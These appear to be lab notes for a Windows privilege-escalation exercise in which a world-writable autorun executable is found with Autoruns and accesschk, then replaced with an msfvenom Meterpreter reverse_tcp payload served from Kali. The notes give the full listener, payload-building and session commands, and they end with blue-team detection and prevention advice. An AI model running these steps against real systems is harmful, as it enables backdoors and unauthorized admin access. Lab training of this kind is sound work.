
---
# Detection Phase (Windows VM)

---

**1.**

```bash
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

**→ Launch Autoruns** to list programs that automatically start when you log in.

---

**2.**  
_(Click on the ‘Logon’ tab.)_  
**→ Filter to only show "Logon" autoruns**, where vulnerable programs can be hijacked.

---

**3.**  
_(Notice entry: “My Program” → `C:\Program Files\Autorun Program\program.exe`)_  
**→ Found a startup program you could possibly overwrite.**
![[Pasted image 20250428103115.png]]

---

**4.**

```bash
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

**→ Check Windows permissions** on the folder and files inside.  
**-wvu** = show who has write access.

---

**5.**  
_(Output shows: "Everyone" has FILE_ALL_ACCESS on program.exe.)_  
**→ Confirmation that anyone can modify the executable.**

---
# Exploitation Phase (Kali VM)

---

**1.**

```bash
msfconsole
```

**→ Start Metasploit Framework**, where you'll create a listener for the incoming reverse shell.

---

**2.**

```bash
use multi/handler
```

**→ Use the multi/handler module** to handle reverse connections from the victim.

---

**3.**

```bash
set payload windows/meterpreter/reverse_tcp
```

**→ Specify payload**: Windows Meterpreter (remote control) over TCP.

---

**4.**

```bash
set lhost [Kali_VM_IP]
```

**→ Set your Kali machine’s IP** address to receive the connection.

---

**5.**

```bash
run
```

**→ Start the handler** — listening for incoming Meterpreter sessions.

---

**6.**

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali_VM_IP] -f exe -o program.exe
```

**→ Create malicious program.exe** that will connect back to Kali when executed.

- `-p` → payload type
    
- `lhost` → listener IP address
    
- `-f exe` → format output as executable
    
- `-o program.exe` → save the output as "program.exe"
    

---

**7.**  
_(Copy program.exe to Windows VM.)_  
**→ Move your malware to the target machine.**

Great! You've started a simple **HTTP server** on Kali with Python using:

```bash
python3 -m http.server 8000
```

This means you're now serving files on **port 8000** and can access them through any browser.

---

### To access the file from **Windows**, follow these steps:

1. **Make sure your Kali machine and Windows machine are on the same network**, or Kali's IP address is accessible from the Windows machine.
    
2. **On Windows**, open a browser and enter the following URL:
    

```plaintext
http://[Kali_IP]:8000/program.exe
```

- Replace `[Kali_IP]` with your actual Kali machine's IP address (e.g., `172.25.30.221`).
    
- The file `program.exe` should be located in the directory where you started the HTTP server on Kali.
    

---

### Example:

If your Kali machine's IP is `172.25.30.221`, you would enter this URL in your browser:

```plaintext
http://172.25.30.221:8000/program.exe
```

---
# Exploitation Phase (Windows VM)

---

**1.**  
_(Manually replace old `program.exe` with the new one at:_

```bash
C:\Program Files\Autorun Program\program.exe
```

)**  
**→ Overwrite vulnerable autorun file with your backdoor executable.**

---

**2.**  
_(Log off and log back on as admin user.)_  
**→ Triggers the autorun process to execute your malicious program.exe automatically.**

---

---

# Post-Exploitation Phase (Kali VM)

---

**1.**  
_(Wait for a session to pop up in Metasploit.)_  
**→ Meterpreter session opens once the user logs back in.**

---

**2.**

```bash
sessions -i [Session_ID]
```

**→ Connect to the opened Meterpreter session.**

---

**3.**

```bash
getuid
```

**→ Check which user you are running as.**

**→ Should now have privileges as an Administrator.**


---

# 🔍 Detection Techniques (Blue Team)

---

### 1. **Monitor Changes to Autorun Entries**

- Use tools like **Sysinternals Autoruns**, **Windows Event Logs**, or **Endpoint Detection and Response (EDR)** software.
    
- Watch for **new or modified autorun entries**, especially if pointing to unusual locations or new executables.
    

**Detection tip:**  
Check these registry paths:

```bash
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

---

### 2. **Alert on Unusual File Write Operations**

- Detect when a **non-admin user** modifies files in **sensitive locations** like `C:\Program Files`.
    
- Normal users should not be writing to `Program Files` — **trigger alerts** on that.
    

**Detection tip (Sysmon rule idea):**

```bash
Event ID 11 (FileCreate) or Event ID 13 (RegistryValueSet)
Filter: TargetFilename = C:\Program Files\Autorun Program\program.exe
```

---

### 3. **Detect Execution of Unsigned Programs**

- If `program.exe` was unsigned or newly modified, running it should **trigger alarms**.
    
- **AppLocker**, **Defender Application Control**, or **EDR products** can flag unsigned/unknown files.
    

---

### 4. **Behavioral Detection**

- Detect programs that suddenly start **reverse TCP connections** (e.g., outgoing traffic to strange IPs).
    
- Tools like **Suricata**, **Zeek**, or **Firewall logs** can monitor unusual outbound traffic.
    

---

# 🛡️ Prevention Techniques (Blue Team)

---

### 1. **Fix File and Directory Permissions**

- NEVER allow “Everyone” or “Authenticated Users” **WRITE access** to Program Files folders.
    
- Correct permissions:
    

```bash
icacls "C:\Program Files\Autorun Program" /inheritance:r /grant:r "Administrators:F" "SYSTEM:F"
```

✅ Only SYSTEM and Administrators should have full control.

---

### 2. **Use Application Whitelisting**

- Enforce **only approved executables** to run using:
    
    - **Windows Defender Application Control (WDAC)**
        
    - **AppLocker**
        
- If "program.exe" changes to a different file hash, **block it**.
    

---

### 3. **Implement Registry Protections**

- Use **GPO (Group Policy Objects)** to restrict who can modify autorun registry keys.
    
- **Disable or tightly control** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` writes.
    

---

### 4. **Monitor and Alert on Meterpreter Artifacts**

- Detect classic Meterpreter behaviors:
    
    - Suspicious memory injection
        
    - Use of `getuid`, `hashdump`, `ps`, etc.
        
- Some EDR products have specific **Meterpreter detection** rules.
    

---

### 5. **User Education + Least Privilege**

- Users should NOT operate day-to-day as Local Admins.
    
- Even if an attack happens, without admin rights it becomes much harder to escalate.
    

---

# 🛡️ Full Defense-in-Depth Summary:

|Area|Action|
|---|---|
|File Permissions|Lock down sensitive folders|
|Application Control|Only allow trusted executables|
|Network Monitoring|Watch for strange outbound connections|
|Behavior Monitoring|Flag autorun, reverse shell behavior|
|Least Privilege|Restrict user rights|
|Logging and Alerting|Always monitor file, registry, and process events|

---

